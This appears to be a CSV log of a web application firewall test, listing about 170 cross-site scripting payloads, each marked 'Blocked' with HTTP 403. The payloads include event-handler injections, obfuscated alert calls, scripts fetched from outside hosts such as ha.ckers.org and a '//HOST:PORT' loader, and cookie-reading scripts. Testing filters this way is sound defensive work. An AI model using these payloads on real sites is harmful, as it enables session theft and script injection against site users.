Status,Payload,HTTP Status,Content Length
Blocked,"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>",403,3662
Blocked,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",403,3662
Blocked,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,403,3662
Blocked,<SCRIPT SRC=//ha.ckers.org/.j>,403,3662
Blocked,"<IMG SRC=""javascript:alert('XSS')""",403,3662
Blocked,<iframe src=http://ha.ckers.org/scriptlet.html <,403,3662
Blocked,</script><script>alert('XSS');</script>,403,3662
Blocked,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",403,3662
Blocked,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",403,3662
Blocked,"<BODY BACKGROUND=""javascript:alert('XSS')"">",403,3662
Blocked,"<IMG DYNSRC=""javascript:alert('XSS')"">",403,3662
Blocked,"<IMG LOWSRC=""javascript:alert('XSS')"">",403,3662
Blocked,"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",403,3662
Blocked,"<IMG SRC='vbscript:msgbox(""XSS"")'>",403,3662
Blocked,"<IMG SRC=""livescript:[code]"">",403,3662
Blocked,<BODY ONLOAD=alert('XSS')>,403,3662
Blocked,"<BGSOUND SRC=""javascript:alert('XSS');"">",403,3662
Blocked,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",403,3662
Blocked,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",403,3662
Blocked,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,403,3662
Blocked,"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",403,3662
Blocked,"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",403,3662
Blocked,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",403,3662
Blocked,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",403,3662
Blocked,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",403,3662
Blocked,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",403,3662
Blocked,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",403,3662
Blocked,"<XSS STYLE=""xss:expression(alert('XSS'))"">",403,3662
Blocked,"<XSS STYLE=""behavior: url(xss.htc);"">",403,3662
Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",403,3662
Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",403,3662
Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",403,3662
Blocked,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",403,3662
Blocked,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",403,3662
Blocked,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",403,3662
Blocked,"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",403,3662
Blocked,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",403,3662
Blocked,"<DIV STYLE=""width: expression(alert('XSS'));"">",403,3662
Blocked,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,403,3662
Blocked,"<BASE HREF=""javascript:alert('XSS');//"">",403,3662
Blocked,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",403,3662
Blocked,"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",403,3662
Blocked,"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",403,3662
Blocked,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",403,3662
Blocked,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",403,3662
Blocked,"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<A HREF=""http://66.102.7.147/"">XSS</A>",403,3662
Blocked,"0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-""",403,3662
Blocked,veris-->group<svg/onload=alert(/XSS/)//,403,3662
Blocked,element[attribute='<img src=x onerror=alert('XSS');>,403,3662
Blocked,"[<blockquote cite=""]"">["" onmouseover=""alert('RVRSH3LL_XSS');"" ]",403,3662
Blocked,javascript:alert%281%29;,403,3662
Blocked,<w contenteditable id=x onfocus=alert()>,403,3662
Blocked,<svg/onload=%26%23097lert%26lpar;1337)>,403,3662
Blocked,<script>for((i)in(self))eval(i)(1)</script>,403,3662
Blocked,"<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a>",403,3662
Blocked,<svg onload=alert(1)>,403,3662
Blocked,"""><svg onload=alert(1)//",403,3662
Blocked,"""onmouseover=alert(1)//",403,3662
Blocked,"""autofocus/onfocus=alert(1)//",403,3662
Blocked,'-alert(1)-',403,3662
Blocked,'-alert(1)//,403,3662
Blocked,</script><svg onload=alert(1)>,403,3662
Blocked,<x contenteditable onblur=alert(1)>lose focus! ,403,3662
Blocked,<x onclick=alert(1)>click this! ,403,3662
Blocked,<x oncopy=alert(1)>copy this! ,403,3662
Blocked,<x oncontextmenu=alert(1)>right click this! ,403,3662
Blocked,<x oncut=alert(1)>copy this! ,403,3662
Blocked,<x ondblclick=alert(1)>double click this! ,403,3662
Blocked,<x ondrag=alert(1)>drag this! ,403,3662
Blocked,<x contenteditable onfocus=alert(1)>focus this! ,403,3662
Blocked,<x contenteditable oninput=alert(1)>input here! ,403,3662
Blocked,<x contenteditable onkeydown=alert(1)>press any key! ,403,3662
Blocked,<x contenteditable onkeypress=alert(1)>press any key! ,403,3662
Blocked,<x contenteditable onkeyup=alert(1)>press any key! ,403,3662
Blocked,<x onmousedown=alert(1)>click this! ,403,3662
Blocked,<x onmousemove=alert(1)>hover this! ,403,3662
Blocked,<x onmouseout=alert(1)>hover this! ,403,3662
Blocked,<x onmouseover=alert(1)>hover this! ,403,3662
Blocked,<x onmouseup=alert(1)>click this! ,403,3662
Blocked,<x contenteditable onpaste=alert(1)>paste here!,403,3662
Blocked,<script>alert(1)// ,403,3662
Blocked,<script>alert(1)<!–,403,3662
Blocked,<script src=//brutelogic.com.br/1.js> ,403,3662
Blocked,<script src=//3334957647/1>,403,3662
Blocked,%3Cx onxxx=alert(1) ,403,3662
Blocked,"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",403,3662
Blocked,'onload=alert(1)><svg/1=',403,3662
Blocked,'>alert(1)</script><script/1=' ,403,3662
Blocked,"*/alert(1)"">'onload=""/*<svg/1='",403,3662
Blocked,"`-alert(1)"">'onload=""`<svg/1='",403,3662
Blocked,*/</script>'>alert(1)/*<script/1=',403,3662
Blocked,<script>alert(1)</script> ,403,3662
Blocked,<script src=javascript:alert(1)> ,403,3662
Blocked,<iframe src=javascript:alert(1)> ,403,3662
Blocked,<embed src=javascript:alert(1)> ,403,3662
Blocked,<a href=javascript:alert(1)>click ,403,3662
Blocked,<math><brute href=javascript:alert(1)>click ,403,3662
Blocked,<form action=javascript:alert(1)><input type=submit> ,403,3662
Blocked,<isindex action=javascript:alert(1) type=submit value=click> ,403,3662
Blocked,<form><button formaction=javascript:alert(1)>click ,403,3662
Blocked,<form><input formaction=javascript:alert(1) type=submit value=click> ,403,3662
Blocked,<form><input formaction=javascript:alert(1) type=image value=click> ,403,3662
Blocked,<form><input formaction=javascript:alert(1) type=image src=SOURCE> ,403,3662
Blocked,<isindex formaction=javascript:alert(1) type=submit value=click> ,403,3662
Blocked,<object data=javascript:alert(1)> ,403,3662
Blocked,<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> ,403,3662
Blocked,"<svg><script xlink:href=data:,alert(1) /> ",403,3662
Blocked,<math><brute xlink:href=javascript:alert(1)>click ,403,3662
Blocked,<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,403,3662
Blocked,<html ontouchstart=alert(1)> ,403,3662
Blocked,<html ontouchend=alert(1)> ,403,3662
Blocked,<html ontouchmove=alert(1)> ,403,3662
Blocked,<html ontouchcancel=alert(1)>,403,3662
Blocked,<body onorientationchange=alert(1)>,403,3662
Blocked,"""><img src=1 onerror=alert(1)>.gif",403,3662
Blocked,"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",403,3662
Blocked,GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,403,3662
Blocked,"""><script src=data:&comma;alert(1)//",403,3662
Blocked,"""><script src=//brutelogic.com.br&sol;1.js&num; ",403,3662
Blocked,"<link rel=import href=""data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; ",403,3662
Blocked,"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",403,3662
Blocked,<base href=//0>,403,3662
Blocked,<body onload=alert(1)>,403,3662
Blocked,<body onpageshow=alert(1)>,403,3662
Blocked,<body onfocus=alert(1)>,403,3662
Blocked,<body onhashchange=alert(1)><a href=#x>click this!#x,403,3662
Blocked,<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x,403,3662
Blocked,<body onscroll=alert(1)><br><br><br><br>,403,3662
Blocked,<body onresize=alert(1)>press F12!,403,3662
Blocked,<body onhelp=alert(1)>press F1! (MSIE),403,3662
Blocked,<marquee onstart=alert(1)>,403,3662
Blocked,<marquee loop=1 width=0 onfinish=alert(1)>,403,3662
Blocked,<audio src onloadstart=alert(1)>,403,3662
Blocked,<video onloadstart=alert(1)><source>,403,3662
Blocked,<input autofocus onblur=alert(1)>,403,3662
Blocked,<keygen autofocus onfocus=alert(1)>,403,3662
Blocked,<form onsubmit=alert(1)><input type=submit>,403,3662
Blocked,<select onchange=alert(1)><option>1<option>2,403,3662
Blocked,<menu id=x contextmenu=x onshow=alert(1)>right click me!,403,3662
Blocked,alert`1`,403,3662
Blocked,(alert)(1),403,3662
Blocked,"a=alert,a(1)",403,3662
Blocked,[1].find(alert),403,3662
Blocked,al\u0065rt(1),403,3662
Blocked,top['al\145rt'](1),403,3662
Blocked,top['al\x65rt'](1),403,3662
Blocked,top[8680439..toString(30)](1),403,3662
Blocked,"xXx%5c%5c%5c%C0%A2xXx//xXx\\\""xXxUTF-83'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E",403,3662
Blocked,<<scr\0ipt/src=http://xss.com/xss.js></script,403,3662
Blocked,%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,403,3662
Blocked,' onmouseover=alert(/XSS/),403,3662
Blocked,"""><iframe%20src=""http://google.com""%%203E",403,3662
Blocked,'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,403,3662
Blocked,x”</title><img src%3dx onerror%3dalert(1)>,403,3662
Blocked,<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>,403,3662
Blocked,"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",403,3662
Blocked,"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>",403,3662
